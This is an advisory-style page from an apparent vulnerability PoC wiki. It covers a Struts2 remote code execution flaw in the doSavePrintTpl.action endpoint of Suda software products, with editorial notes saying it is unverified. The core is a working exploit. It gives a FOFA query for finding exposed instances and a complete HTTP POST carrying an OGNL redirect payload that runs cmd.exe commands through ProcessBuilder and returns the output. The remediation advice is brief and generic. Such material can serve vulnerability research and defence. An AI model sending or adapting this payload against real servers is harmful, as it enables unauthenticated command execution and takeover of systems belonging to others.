---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "速达软件 多款产品 doSavePrintTpl.action Struts2远程代码执行漏洞"
product: "速达软件多款产品（产品型号未列）"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Windows cmd.exe、Struts危险前缀处理、端点无有效鉴权；版本/具体型号缺失"
fofa_unverified: "body="
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-20fb7afcc8aba3bf1b11d6eb"
entity_id: "ve-20fb7afcc8aba3bf1b11d6eb"
schema_version: "1"
---

# 速达软件 多款产品 doSavePrintTpl.action Struts2远程代码执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Windows cmd.exe、Struts危险前缀处理、端点无有效鉴权；版本/具体型号缺失
- 证据范围：与265相同redirect链，目标业务不同，不能只按框架payload把两产品当重复条目。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 应主归速达ERP/软件产品并关联Struts依赖，需列具体受影响产品版本
- FOFA frontmatter残缺body=，正文两条件完整
- 在野已知/广泛影响/低复杂度无证据来源
- HTTP无代码围栏，编码/固定参数尚未验证，状态仅截图
- 升级安全版本没有明确版本和官方出处

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 漏洞描述

由于速达软件 多款产品使用Struts2开发框架组件，存在历史Struts2远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。

# 影响版本

速达软件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="速达软件技术（广州）有限公司" && body="jslib/extjs2.3/view/PasswordField.js"

POC/EXP：

POST /common/print/print!doSavePrintTpl.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String[]{'cmd.exe','/c','whoami'})).start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D=

![image-20250306154645476](./.resource/速达软件多款产品doSavePrintTpl.actionStruts2远程代码执行漏洞/media/image-20250306154645476.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
